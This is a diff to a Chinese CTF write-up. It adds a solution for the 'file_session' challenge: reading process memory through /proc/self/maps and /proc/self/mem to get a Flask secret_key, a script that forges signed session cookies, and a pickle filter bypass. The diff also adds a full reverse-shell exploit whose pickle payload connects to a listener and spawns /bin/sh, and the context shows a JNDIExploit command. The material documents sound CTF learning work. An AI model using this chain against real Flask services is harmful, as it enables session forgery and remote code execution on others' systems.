@@ -105,7 +105,7 @@ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i vps -p 8080 -l 8089
 ```
 ### file_session
 
-由于没怎么了解过java安全，所以比赛时主要在做这道，但是最后这也是个0解题，并且到现在也没看到官方wp,而且交流群内各位师傅基本上都卡在如何读取secret_key从而伪造session上了，要么是不知道怎么读secret_key像我一样，要么就是读到了但是靶机识别不了伪造的session。
+由于没怎么了解过java安全，所以比赛时主要在做这道，但是最后这也是个0解题，交流群内各位师傅基本上都卡在如何读取secret_key从而伪造session上了，要么是不知道怎么读secret_key像我一样，要么就是读到了但是靶机识别不了伪造的session。
 
 来说说当时的解题思路和赛后复现的情况。
 
@@ -192,7 +192,9 @@ app.config.update(dict(
 ))
 ```
 
-上面就是比赛时的思考，赛后和atao师傅交流了一下，发现可以通过`/proc/self/maps`和`/proc/self/mem`读取这个进程的内存，从而获取uuid。
+上面就是比赛时的思考，赛后和atao师傅交流了一下，发现可以通过`/proc/self/maps`读取堆栈分布，进而通过`/proc/self/mem`读取这个进程的内存分布，从而获取uuid。但是神奇的是远程环境读到secret_key后，却没有办法识别到伪造的session,不知道为什么，但是在本地却可以。看到[官方wp](https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&mid=2247493655&idx=1&sn=2eafc10949807487d993882220d05271&chksm=c1d9a84ef6ae2158dac0f1e00fc04efd4e8a0966e16aaaf7a1c00e46ff1fa97b5f574d051721&mpshare=1&scene=23&srcid=07134xssC34Apm45RHto6pPS&sharer_sharetime=1657706356282&sharer_shareid=bc030b6a5149970738c6328966d9421d#rd)后发现，识别不到伪造的session原因是服务端时间与我们本地环境的时间不同，导致用正常时间伪造的session在服务端是无法解析的，这里需要自己写脚本伪造session。
+
+从堆栈上获取secret_key的脚本
 
 ```python
 #!/usr/bin/env python
@@ -220,11 +222,116 @@ for i in maplist:
             print end-start
 ```
 
-但是神奇的是远程环境读到secret_key后，却没有办法识别到伪造的session,不知道为什么，但是在本地却可以。
+对默认生成的session识别后，发现系统时间已经是2030年，因此还需要利用`/usr/local/lib/faketime/libfaketime.so.1`这个动态链接库来劫持程序获取系统时间时的返回值。
 
-当pickle反序列化后就可以直接RCE，并不用像PHP这样需要找反序列化链找危险函数来达成RCE.
+```python
+import hmac
+import base64
 
-参考文章<https://zhuanlan.zhihu.com/p/89132768>
+
+def sign_flask(data, key, times):
+    digest_method = 'sha1'
+
+    def base64_decode(string):
+        string = string.encode('utf8')
+        string += b"=" * (-len(string) % 4)
+        try:
+            return base64.urlsafe_b64decode(string)
+        except (TypeError, ValueError):
+            raise print("Invalid base64-encoded data")
+
+    def base64_encode(s):
+        return base64.b64encode(s).replace(b'=', b'')
+
+    salt = b'cookie-session'
+    mac = hmac.new(key.encode("utf8"), digestmod=digest_method)
+    mac.update(salt)
+    key = mac.digest()
+
+    msg = base64_encode(data.encode("utf8")) + b'.' + base64_encode(times.to_bytes(8, 'big'))
+    data = hmac.new(key, msg=msg, digestmod=digest_method)
+    hs = data.digest()
+    # print(hs)
+    # print(msg+b'.'+ base64_encode(hs))
+    # print(int.from_bytes(times.to_bytes(8,'big'),'big'))
+    return msg + b'.' + base64_encode(hs)
+
+base64_data = base64.b64encode(b'test')
+print(sign_flask('{"data":{" b":"' + base64_data.decode() + '"}}', 'b3876b37-f48e-49af-ab35-b12fe458a64b', 1893532360))
+```
+
+这样伪造的session就能被成功识别，接口返回500。
+
+那么当我们可以用pickle反序列化后就可以直接RCE，但是需要注意的是题目还魔改了pickle.py这个导入的库文件，过滤了一些字符。通过构造`bytes.__new__(bytes,map.__new__(map,eval,['print(11111)']))`可以绕过。
+
+反弹shell脚本
+
+```python
+import requests
+import hmac
+import base64
+
+
+def sign_flask(data, key, times):
+    digest_method = 'sha1'
+
+    def base64_decode(string):
+        string = string.encode('utf8')
+        string += b"=" * (-len(string) % 4)
+        try:
+            return base64.urlsafe_b64decode(string)
+        except (TypeError, ValueError):
+            raise print("Invalid base64-encoded data")
+
+    def base64_encode(s):
+        return base64.b64encode(s).replace(b'=', b'')
+
+    salt = b'cookie-session'
+    mac = hmac.new(key.encode("utf8"), digestmod=digest_method)
+    mac.update(salt)
+    key = mac.digest()
+
+    msg = base64_encode(data.encode("utf8")) + b'.' + base64_encode(times.to_bytes(8, 'big'))
+    data = hmac.new(key, msg=msg, digestmod=digest_method)
+    hs = data.digest()
+    # print(hs)
+    # print(msg+b'.'+ base64_encode(hs))
+    # print(int.from_bytes(times.to_bytes(8,'big'),'big'))
+    return msg + b'.' + base64_encode(hs)
+
+
+def Cmd(url):
+    code = b'''c__builtin__
+map
+p0
+0(]S'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.244.133",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ap1
+0](c__builtin__
+exec
+g1
+ep2
+0g0
+g2
+\x81p3
+0c__builtin__
+bytes
+p4
+g3
+\x81
+.'''
+
+    # /usr/lib/python3.8/pickle.py
+    tmp_payload = base64.b64encode(base64.b64encode(code)).decode()
+    payload = sign_flask('{"data":{" b":"' + tmp_payload + '"}}', 'b3876b37-f48e-49af-ab35-b12fe458a64b', 1893532360)
+    cookies = {"session": payload.decode()}
+    print(payload)
+    sess = requests.session()
+    print(sess.get(url + '/admin_pickle_load', cookies=cookies).text)
+
+
+url = "http://192.168.244.133:7410/"
+Cmd(url)
+```
 
 ## misc
 
